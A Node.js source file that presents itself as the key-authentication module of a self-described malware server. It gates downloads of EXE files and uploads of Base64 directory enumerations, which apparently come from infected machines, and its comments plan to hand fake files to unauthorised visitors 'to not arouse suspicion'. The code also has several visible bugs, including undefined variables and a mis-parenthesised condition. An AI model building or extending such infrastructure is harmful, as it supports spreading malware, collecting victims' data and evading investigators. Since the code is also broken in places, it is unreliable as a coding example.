/*
    This module is used to authenticate incoming requests and responses.
    If, for some reason, a request is not authenticated, the server should either throw an error or return a fake "malware" file to not arouse suspicion.
    The keys should be hashed - it seems kind of counterintuitive since this is a malware server, 
    but we don't want someone uploading fake/useless information if they do get access to the server.
*/
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const exe_path = require("./exe_paths.js");

/**
 * Valid keys for GET requests to retrieve EXE files.
 * These should never be changed after initialization and its usage should always be "GET"
 */
module.exports.get_keys = [

];

module.exports.post_keys = [

];

/**
 * A class that structures the get and post keys.
 * We'll go more in depth about how the keys are intended to work
 */
module.exports.Keys = new class
{
    /**
     * Creates a `Key` object. These keys are stored as `SHA-512` hashes and referenced by their IP.
     * These hashes **will** be saved in a text file by their IP addresses when they're first created.
     * If you're modifying this code yourself, it might make more sense to use a SQL/noSQL database, but I feel it's unnecessary for the scope of this malware server and 
     * only creates more security vulnerabilities (also because MongoDB Atlas is lowkey kind of expensive to keep up and running).
     * @param {String} key Intended Password/Key.
     * @param {String} ip Ideally, an IP address goes here so we can track who is generating (and hence, using) the key.
     * @param {Boolean} single_use Whether or not the key is single use
     * @param {String} usage Use case of the key (ie. ENUMERATE --> Key to upload enumerated directory data). This must match a valid EXE parameter from `./exe_paths.js`
     */
    constructor(key, ip, single_use, usage)
    {
        /**
         * Hash of the password/key. This is stored as hex.
         * @type {String}
         */
        this.hash = crypto.createHash("sha512").update(key).digest("hex");

        /**
         * IP that generated the key.
         * @type {String}
         */
        this.ip = ip;

        /**
         * Whether or not to destroy the key upon use
         * @type {Boolean}
         */
        this.single_use = single_use;

        /**
         * What this key is used for. For example, "ENUMERATE" links to the key for uploading file enmumerations in Base64.
         * @type {String}
         */
        if (exe_path[usage] == null) console.error(`WARNING: Declared usage for ${key} with IP ${ip} is invalid.`);
        this.usage = exe_path[usage] || usage == "GET" ? usage : "";

        /**
         * Path to store the key information in the event of a server restart
         * @type {String}
         */
        this.path_name = path.join(__dirname, "./Keys/", this.hash);

        this.generate_auth_file();
    }

    /**
     * Generates a text file to save the key hash (and other data) in, if it doesn't already exist
     */
    generate_auth_file()
    {
        if (!fs.existsSync(this.path_name))
        {
            fs.writeFileSync(this.path_name, `${this.ip}\n${this.single_use}\n${this.usage}`, {
                encoding: "ascii"
            });
        }
    }

    /**
     * Deletes the key item and its associated file in `./Keys`
     */
    delete()
    {
        try
        {
            // If file exists, delete it
            if (fs.existsSync(this.path_name))
            {
                fs.unlinkSync(this.path_name);
            }
            
            delete this;
        }
        catch(err)
        {
            console.error(`ERROR: cannot remove key file ${key} with IP ${ip}.`)
        }
    }

    /**
     * Creates a key object from file
     * @param {String} path_name Path name (preferably absolute pathing since Express is finnicky) to the file
     * @returns {Keys} A key object using the file contents
     */
    static create_from_file(path_name)
    {
        let read_str = fs.readFileSync(path_name, {
            encoding: "ascii"
        }).split("\n");

        var hash = path.basename(path_name);

        let new_key = new this(hash, read_str[0], read_str[1] == "true", read_str[2]);
        // Overwriting the hash since the file name is already the hash.
        new_key.hash = hash;

        return new_key;
    }
}

// Upon loading auth.js, read through everything in Keys and populate get_keys and post_keys.
fs.readdir(path.resolve(__dirname, "./Keys/"), {
    encoding: "ascii"
}, (err, files) => {
    if (err)
    {
        console.error("🚨 STARTUP ERROR: Failed to load get_keys and post_keys upon startup");
    }
    else
    {
        console.log("✔️ Retrieved all keys in ./Keys/");

        files.forEach(file => {
            var file_path = path.resolve(__dirname, "./Keys/", file.name);
            let generated_key = this.Keys.create_from_file(file_path);

            // Recall that only get_keys could have 'GET' as their usage
            if (generated_key.usage == "GET")
            {
                this.get_keys.push(generated_key);
            }
            else
            {
                this.post_keys.push(generated_key);
            }
        });

        console.log("✔️ get_keys and post_keys directory loaded");
    }
});